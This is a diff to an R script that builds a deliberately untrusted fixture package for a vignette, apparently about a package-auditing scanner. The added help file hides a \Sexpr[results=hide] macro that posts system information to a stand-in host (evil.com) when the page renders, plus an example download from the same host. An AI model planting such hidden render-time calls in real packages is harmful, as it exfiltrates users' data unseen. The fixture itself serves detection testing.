@@ -7,8 +7,11 @@
 # it exists only so the vignette has something with findings to scan. Its
 # contents are deliberately chosen to produce one finding of each kind: a file
 # context (configure), a code context (.onLoad), two patterns in different code
-# contexts (system() at load, download.file() in an ordinary function), and one
-# expression in the file context (curl in configure).
+# contexts (system() at load, download.file() in an ordinary function), one
+# expression in the file context (curl in configure), and two patterns in a
+# help file -- one in a visible \examples{} block and one in a \Sexpr[results=
+# hide]{} macro that runs when the help page is rendered but shows nothing to a
+# reader of it.
 
 create_untrustedpkg <- function(
   dest    = file.path("inst", "extdata", "untrustedpkg"),
@@ -17,6 +20,7 @@ create_untrustedpkg <- function(
   src <- file.path(tempdir(), "untrustedpkg")
   unlink(src, recursive = TRUE)
   dir.create(file.path(src, "R"), recursive = TRUE)
+  dir.create(file.path(src, "man"))
 
   writeLines(c(
     "Package: untrustedpkg",
@@ -49,6 +53,32 @@ create_untrustedpkg <- function(
     "  download.file(url, tempfile())",
     "}"
   ), file.path(src, "R", "fetch.R"))
+
+  # A help file carries R code in two places that run at different times. The
+  # \examples{} block runs under R CMD check and is shown on the rendered help
+  # page. The \Sexpr[results=hide]{} macro runs when the page is rendered --
+  # during R CMD build and installation from source -- but results=hide
+  # suppresses its output, so a reader viewing ?fetch_data never sees it, even
+  # though the code has run. That is the point of putting it here: pkgaudit
+  # reads code a human reader of the help page cannot. Like the rest of
+  # untrustedpkg it is meant only to be scanned, never executed; the httr call
+  # posts nothing sensitive (only Sys.info()), but it would attempt a real
+  # request if the page were ever rendered, so this package must not be built,
+  # installed, or have its help viewed.
+  writeLines(c(
+    "\\name{fetch_data}",
+    "\\alias{fetch_data}",
+    "\\title{Fetch Data From a URL}",
+    "\\description{",
+    "  Downloads the contents of \\code{url} to a temporary file.",
+    "  \\Sexpr[results=hide]{httr::POST(\"https://www.evil.com/collect\", body = list(info = Sys.info()))}",
+    "}",
+    "\\usage{fetch_data(url)}",
+    "\\arguments{\\item{url}{A URL to download.}}",
+    "\\examples{",
+    "download.file(\"https://www.evil.com/data.csv\", tempfile())",
+    "}"
+  ), file.path(src, "man", "fetch_data.Rd"))
 
   if (!dir.exists(dest)) dir.create(dest, recursive = TRUE)
   tarball <- file.path(
